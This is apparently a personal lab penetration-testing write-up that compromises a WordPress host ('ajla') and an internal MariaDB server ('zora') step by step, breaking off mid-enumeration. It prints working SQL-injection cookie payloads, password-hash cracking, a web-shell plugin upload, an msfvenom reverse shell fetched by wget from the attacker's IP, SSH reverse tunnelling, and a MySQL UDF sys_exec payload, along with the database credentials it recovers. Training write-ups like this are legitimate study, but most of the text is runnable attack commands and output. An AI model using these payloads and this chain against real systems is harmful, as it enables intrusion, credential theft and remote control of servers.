<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wordpress survey poll</span><br><span class="line">------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                    |  Path</span><br><span class="line">------------------------------------------------------------------ ---------------------------------</span><br><span class="line">WordPress Plugin Survey &amp; Poll 1.5.7.3 - &#39;sss_params&#39; SQL Injecti | php&#x2F;webapps&#x2F;45411.txt</span><br><span class="line">WordPress Plugin Survey and Poll 1.1 - Blind SQL Injection        | php&#x2F;webapps&#x2F;36054.txt</span><br><span class="line">------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<p>wpscan indicate the plugin version could be <code>1.5.7.3 </code></p>
<p>look at its description:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45411.txt</span><br><span class="line">[&quot;1650149780&#39;)) OR 1&#x3D;2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#&quot;]</span><br></pre></td></tr></table></figure>

<p>Use burpsuite to intercept the communication</p>
<h2 id="SQL-injection-through-cookie"><a href="#SQL-injection-through-cookie" class="headerlink" title="SQL injection through cookie"></a>SQL injection through cookie</h2><p>Use burpsuite repeater,<br>proxy-&gt;http_history-&gt;find the request-&gt;send to repeater</p>
<p>replace the cookie with:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;1650149780&#39;)) OR 1&#x3D;2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#&quot;]</span><br></pre></td></tr></table></figure>
<p>and send to the server,<br>find db version: <code>10.3.20-MariaDB</code>  </p>
<p>get a list of table:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;1650149780&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#&quot;]</span><br></pre></td></tr></table></figure>
<p>find an interesting table: <code>wp_users</code><br>find its coloums: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;16232480&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns where table_name&#x3D;&#39;wp_users&#39;#&quot;];</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\&quot;ID\&quot;],[\&quot;user_login\&quot;],[\&quot;user_pass\&quot;],[\&quot;user_nicename\&quot;],[\&quot;user_email\&quot;],[\&quot;user_url\&quot;],[\&quot;user_registered\&quot;],[\&quot;user_activation_key\&quot;],[\&quot;user_status\&quot;],[\&quot;display_name\&quot;]]&#125;</span><br></pre></td></tr></table></figure>
<p>get login name:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;16232480&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#&quot;];</span><br></pre></td></tr></table></figure>
<p><code>wp_ajla_admin</code><br>get password:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;16232480&#39;)) OR 1&#x3D;2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users where user_login&#x3D;&#39;wp_ajla_admin&#39;#&quot;];</span><br></pre></td></tr></table></figure>
<p>the result is hash：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[\&quot;$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i\\\&#x2F;\&quot;]</span><br><span class="line">$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i&#x2F;</span><br></pre></td></tr></table></figure>
<p>it uses three <code>\\\</code> to escape a single / </p>
<p>cracking the password from hash, use the rockyou wordlist: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i&#x2F;&#39; &gt; pass.txt</span><br><span class="line"></span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt pass.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128&#x2F;128 AVX 4x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">!love29jan2006!  (?)</span><br><span class="line">1g 0:00:19:52 DONE (2021-07-11 15:22) 0.000838g&#x2F;s 12018p&#x2F;s 12018c&#x2F;s 12018C&#x2F;s !luv2:P..!lilkilla!</span><br><span class="line">Use the &quot;--show --format&#x3D;phpass&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Login the wp page with password: <code>wp_ajla_admin</code>/<code>!love29jan2006!</code><br><a target="_blank" rel="noopener" href="http://sandbox.local/wp-admin">http://sandbox.local/wp-admin</a></p>
<h1 id="Enumerating-the-admin-interface"><a href="#Enumerating-the-admin-interface" class="headerlink" title="Enumerating the admin interface"></a>Enumerating the admin interface</h1><p>For wordpress, look at the info tag: tool-&gt;site_health-&gt;info</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">Server architecture	Linux 4.4.0-21-generic x86_64</span><br><span class="line">Web server	Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">PHP version	7.0.33-0ubuntu0.16.04.7 (Supports 64bit values)</span><br><span class="line"></span><br><span class="line">Database:</span><br><span class="line">Extension	mysqli</span><br><span class="line">Server version	10.3.20-MariaDB</span><br><span class="line">Client version	mysqlnd 5.0.12-dev - 20150407 - $Id: b5c5906d452ec590732a93b051f3827e02749b83 $</span><br><span class="line">Database user	wp</span><br><span class="line">Database host	10.5.5.11</span><br></pre></td></tr></table></figure>

<p>Database in running on <code>10.5.5.11</code>, different from what we are targeting. <code>10.11.1.250</code></p>
<p>we can install our own plugins, there are some malicious wordpress plugins</p>
<p>in <code>seclis</code>： <code>cd /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php</code></p>
<p>upload plugin and get error:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature</span><br></pre></td></tr></table></figure>

<p>Search online, and find that I need to pack the php file to zip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip bad_plugin.zip &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Web-Shells&#x2F;WordPress&#x2F;plugin-shell.php</span><br></pre></td></tr></table></figure>
<p>then upload </p>
<p>fatal error when try to activate:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin could not be activated because it triggered a fatal error.</span><br></pre></td></tr></table></figure>
<p>it dont need to be activate </p>
<p>test:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;id</span><br></pre></td></tr></table></figure>
<p>ok, it works, then we tries to generate a reverse shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.119.165 LPORT&#x3D;443 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
<p>we know the target is a linux machine, we use LPORT=443 to evade any outbound firewall rules</p>
<p>then upload the shell to that machine, create a python sever at current directory</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br></pre></td></tr></table></figure>
<p>download the shell binary</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;wget%20http:&#x2F;&#x2F;192.168.119.165&#x2F;shell.elf</span><br></pre></td></tr></table></figure>
<p>use <code>%20</code> to replace space in url</p>
<p>start a listening port</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo msfconsole -q -x &quot;use exploit&#x2F;multi&#x2F;handler;\</span><br><span class="line">&gt; set PAYLOAD linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp;\</span><br><span class="line">&gt; set LHOST 192.168.119.165;\</span><br><span class="line">&gt; set LPORT 443;\</span><br><span class="line">&gt; run&quot;</span><br></pre></td></tr></table></figure>

<p>execute the reverse shell, first check the permission</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;ls%20-l%20shell.elf</span><br><span class="line"># change the permission</span><br><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;chmod%20777%20shell.elf</span><br></pre></td></tr></table></figure>
<p>run</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;plugins&#x2F;bad_plugin&#x2F;plugin-shell.php?cmd&#x3D;.&#x2F;shell.elf</span><br></pre></td></tr></table></figure>

<p>in meterpreter, can goto regular shell use <code>shell</code></p>
<h1 id="Post-Exploitation-Enumeration"><a href="#Post-Exploitation-Enumeration" class="headerlink" title="Post-Exploitation Enumeration"></a>Post-Exploitation Enumeration</h1><p>gather some information such as network config, hostname, os version and kernel info</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">ens160    Link encap:Ethernet  HWaddr 00:50:56:bf:19:da  </span><br><span class="line">          inet addr:10.4.4.10  Bcast:10.4.4.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::250:56ff:febf:19da&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:158345 errors:0 dropped:240 overruns:0 frame:0</span><br><span class="line">          TX packets:169172 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:122457155 (122.4 MB)  TX bytes:68118761 (68.1 MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1&#x2F;128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:732 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:732 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:67520 (67.5 KB)  TX bytes:67520 (67.5 KB)</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line">ajla</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line">Linux ajla 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">Ubuntu 16.04 LTS \n \l</span><br><span class="line"></span><br><span class="line">cat &#x2F;proc&#x2F;version</span><br><span class="line">Linux version 4.4.0-21-generic (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016</span><br></pre></td></tr></table></figure>

<p>find database credentials in the configuration file: <code>wp-config.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">cat wp-config.php</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;wp&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;Lv9EVQq86cfi8ioWsqFUQyU&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;10.5.5.11&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br><span class="line"></span><br><span class="line">define( &#39;WP_HTTP_BLOCK_EXTERNAL&#39;, true );</span><br></pre></td></tr></table></figure>

<h1 id="Creating-a-stable-pivot-point"><a href="#Creating-a-stable-pivot-point" class="headerlink" title="Creating a stable pivot point"></a>Creating a stable pivot point</h1><p>when then try to login to the internal network, e.g. the database server <code>10.5.5.11</code><br>since we do not have root access to create ssh server, we should use reverse ssh tunneling</p>
<p>first we need to know which port is running the database server </p>
<p>create a quick portscan script</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">host&#x3D;10.5.5.11</span><br><span class="line">for port in &#123;1..65535&#125;; do</span><br><span class="line">    timeout .1 bash -c &quot;echo &gt;&#x2F;dev&#x2F;tcp&#x2F;$host&#x2F;$port&quot; &amp;&amp;</span><br><span class="line">    echo &quot;port $port is open&quot;</span><br><span class="line">done</span><br><span class="line">echo &quot;Done&quot;</span><br></pre></td></tr></table></figure>

<p>upload the script use meterpreter:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload ~&#x2F;script&#x2F;portscan.sh &#x2F;tmp&#x2F;portscan.sh </span><br><span class="line"></span><br><span class="line">chmod +x portscan.sh</span><br><span class="line">.&#x2F;portscan.sh</span><br><span class="line">port 3306 is open</span><br></pre></td></tr></table></figure>

<p>default mariadb port is also <code>3306</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@192.168.119.165</span><br></pre></td></tr></table></figure>

<p>but it will prompt us for 1. accept hostkey, 2. password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o &quot;UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null&quot; -o &quot;StrictHostKeyChecking&#x3D;no&quot; kali@192.168.119.165</span><br></pre></td></tr></table></figure>
<p><code>UserKnownHostsFile</code> do not save host keys<br><code>StrictHostKeyChecking</code> do not prompt </p>
<p>to avoid the prompt for password, we generate ssh key on target machine </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBK2RDq8McGN6Av2gpVYvS6nwi6r10XFYVQsQAxQLDwaprw4pJObKgcpgXkgj48cSLCJ8473Jv3y8FUpqgN8sX3EJseG43ni45kP&#x2F;i3yQJ7sTmbG6&#x2F;ZsIdxZM4dC9oK9JbHTnko&#x2F;8d24lJMxAGwvskjFpCRjcBu1OVUmRziWFTG5v6zVaebvFt2DlP3XaDPZysZg4+Xh5iS+&#x2F;T73aarEJbLz5EEz7Nnq06bHvMOn&#x2F;hQqqiIZ6jgHVzSMu7eolt1hh7+CsCjaNctURir4JRCAMjEWmpQ+xy39b6PmqDLbJfKon68Xv685fB6d+O2vJr&#x2F;lO8KaKEnhEUwRw5GwN45hRT www-data@ajla</span><br></pre></td></tr></table></figure>

<p>in kali’s <code>authorized_keys</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from&#x3D;&quot;10.11.1.250&quot;,command&#x3D;&quot;echo &#39;This account can only be used for port forwarding&#39;&quot;,no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa</span><br><span class="line">AAAAB3NzaC1yc2EAAAADAQABAAABAQDBK2RDq8McGN6Av2gpVYvS6nwi6r10XFYVQsQAxQLDwaprw4pJObKgcpgXkgj48cSLCJ8473Jv3y8FUpqgN8sX3EJseG43ni45kP&#x2F;i3yQJ7sTmbG6&#x2F;ZsIdxZM4dC9oK9JbHTnko&#x2F;8d24lJMxAGwvskjFpCRjcBu1OVUmRziWFTG5v6zVaebvFt2DlP3XaDPZysZg4+Xh5iS+&#x2F;T73aarEJbLz5EEz7Nnq06bHvMOn&#x2F;hQqqiIZ6jgHVzSMu7eolt1hh7+CsCjaNctURir4JRCAMjEWmpQ+xy39b6PmqDLbJfKon68Xv685fB6d+O2vJr&#x2F;lO8KaKEnhEUwRw5GwN45hRT www-data@ajla</span><br></pre></td></tr></table></figure>

<p>in shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o &quot;UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null&quot; -o &quot;StrictHostKeyChecking&#x3D;no&quot; -i &#x2F;tmp&#x2F;keys&#x2F;id_rsa kali@192.168.119.165</span><br></pre></td></tr></table></figure>
<p><code>-f</code> run in background</p>
<h1 id="Targeting-the-database"><a href="#Targeting-the-database" class="headerlink" title="Targeting the database"></a>Targeting the database</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql --host&#x3D;127.0.0.1 --port&#x3D;13306 --user&#x3D;wp -p </span><br><span class="line">Lv9EVQq86cfi8ioWsqFUQyU</span><br></pre></td></tr></table></figure>

<p>look at what privilege we have:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW Grants;</span><br><span class="line">GRANT USAGE ON *.* TO &#39;wp&#39;@&#39;%&#39; IDENTIFIED BY PASSWORD &#39;*61163AE4B131AB0E43F07BE7B&#39; |</span><br><span class="line">GRANT SELECT, INSERT, UPDATE, DELETE ON &#96;wordpress&#96;.* TO &#39;wp&#39;@&#39;%&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;</span><br><span class="line">+------------+----------+-----------------+---------------------------+-------------------+</span><br><span class="line">| @@hostname | @@tmpdir | @@version       | @@version_compile_machine | @@plugin_dir      |</span><br><span class="line">+------------+----------+-----------------+---------------------------+-------------------+</span><br><span class="line">| zora       | &#x2F;var&#x2F;tmp | 10.3.20-MariaDB | x86_64                    | &#x2F;home&#x2F;dev&#x2F;plugin&#x2F; |</span><br><span class="line">+------------+----------+-----------------+---------------------------+-------------------+</span><br><span class="line">1 row in set (0.026 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit maria</span><br></pre></td></tr></table></figure>
<p>non of the exploit work for current version of maria</p>
<p>search for more generic <code>mysql</code> exploit, since maria is built on mysql</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mysql</span><br></pre></td></tr></table></figure>

<p>UDF user-defined function show up often???? how did you get here?</p>
<p>find an interesting github repo:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mysqludf&#x2F;lib_mysqludf_sys.git</span><br></pre></td></tr></table></figure>

<p>to compile, install some packages:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install default-libmysqlclient-dev libmariadbd-dev</span><br></pre></td></tr></table></figure>

<p>modify make file, to make it include maria’s header file. hmmmm..</p>
<p>output so to shellcode:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p lib_mysqludf_sys.so | tr -d &#39;\n&#39; &gt; lib_mysqludf_sys.so.hex</span><br></pre></td></tr></table></figure>

<p>tr -d delete;<br>xxd dump to hex</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mariadb&gt; set @shell&#x3D;0x7abf.....;</span><br><span class="line">select @@plugin_dir; </span><br><span class="line">select binary @shell into dumpfile &#39;&#x2F;home&#x2F;dev&#x2F;plugin&#x2F;udf_sys_exec.so&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>We get error since wp does not have permission to write file  </p>
<p>go back to ajla to see if we can find root credentials</p>
<h1 id="Deeper-Enumeration-of-the-Web-Application-Server"><a href="#Deeper-Enumeration-of-the-Web-Application-Server" class="headerlink" title="Deeper Enumeration of the Web Application Server"></a>Deeper Enumeration of the Web Application Server</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>

<p>find a good local privelege escalation script<br>compile locally and upload to ajla, we get the root</p>
<p>then we add our ssh pubkey to root</p>
<p>then we can ssh <code>root@sandbox.local</code> to the ajla</p>
<h2 id="search-for-DB-credentials"><a href="#search-for-DB-credentials" class="headerlink" title="search for DB credentials"></a>search for DB credentials</h2><p>inspect <code>.bash_history</code>, find:<br><code>mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e &#39;DROP DATABASE wordpress;&#39;</code>  </p>
<h1 id="Targeting-the-database-again"><a href="#Targeting-the-database-again" class="headerlink" title="Targeting the database again"></a>Targeting the database again</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql --host&#x3D;127.0.0.1 --port&#x3D;13306 --user&#x3D;root -pBmDu9xUHKe3fZi3Z7RdMBeb</span><br><span class="line">mariadb&gt; set @shell&#x3D;0x7abf.....;</span><br><span class="line">select @@plugin_dir; </span><br><span class="line">select binary @shell into dumpfile &#39;&#x2F;home&#x2F;dev&#x2F;plugin&#x2F;udf_sys_exec.so&#39;;</span><br><span class="line">create function sys_exec returns int soname &#39;udf_sys_exec.so&#39;;</span><br><span class="line">select * from mysql.func where name&#x3D;&#39;sys_exec&#39;;</span><br></pre></td></tr></table></figure>

<p>test to see if we can make network call from zora to kali</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali&gt; sudo python3 -m http.server 80</span><br></pre></td></tr></table></figure>
<p>let zora grab our shell.elf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#39;wget http:&#x2F;&#x2F;192.168.119.165&#x2F;shell.elf&#39;);</span><br><span class="line">select sys_exec(&#39;chmod +x .&#x2F;shell.elf&#39;);</span><br></pre></td></tr></table></figure>

<p>make sure metasploit is ready for the connection</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit # exit root shell</span><br><span class="line">exit # exit shell</span><br><span class="line">exit</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">select sys_exec(&#39;.&#x2F;shell.elf&#39;);</span><br></pre></td></tr></table></figure>
<p>get the shell of mysql user</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue # get linux version</span><br><span class="line">Alpine Linux 3.10</span><br><span class="line"></span><br><span class="line">cat &#x2F;proc&#x2F;version # get kernel version</span><br><span class="line">Linux version 4.19.78-0-virt (buildozer@build-3-10-x86_64) (gcc version 8.3.0 (Alpine 8.3.0)) #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line">linux zora 4.19.78-0-virt #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019 x86_64 Linux</span><br><span class="line"></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line">ps ux</span><br><span class="line"></span><br><span class="line">netstat 